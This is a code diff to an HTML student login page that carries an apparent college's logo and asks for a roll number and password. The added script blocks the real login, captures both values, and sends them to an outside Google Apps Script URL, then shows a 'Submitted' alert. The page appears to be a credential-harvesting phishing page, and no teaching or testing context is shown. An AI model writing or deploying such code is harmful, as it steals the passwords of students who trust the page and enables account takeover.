@@ -64,11 +64,30 @@
     <!-- Replace the src URL with your college logo if stored locally -->
     <img src="https://sece.ac.in/wp-content/uploads/2024/05/clg-logo2-1024x292.webp" alt="SECE Logo">
     <h2>Student Login</h2>
-    <form action="/login" method="post">
+    <form id="loginForm" action="/login" method="post">
       <input type="text" name="username" placeholder="Enter Roll Number" required><br>
       <input type="password" name="password" placeholder="Enter Password" required><br>
       <button type="submit">Login</button>
     </form>
   </div>
+   <script>
+    const form = document.getElementById('loginForm');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const formData = {
+        username: form.username.value,
+        password: form.password.value
+      };
+
+      await fetch("https://script.google.com/macros/s/AKfycbwiYOMyheqjo0znKg9V9aee5fMYBpzhbGotchgpU2Ql2YlaHYm2yze7eq8i3kuqBRszgg/exec", {
+        method: "POST",
+        body: JSON.stringify(formData)
+      });
+
+      alert("Submitted");
+    });
+  </script>
 </body>
 </html>
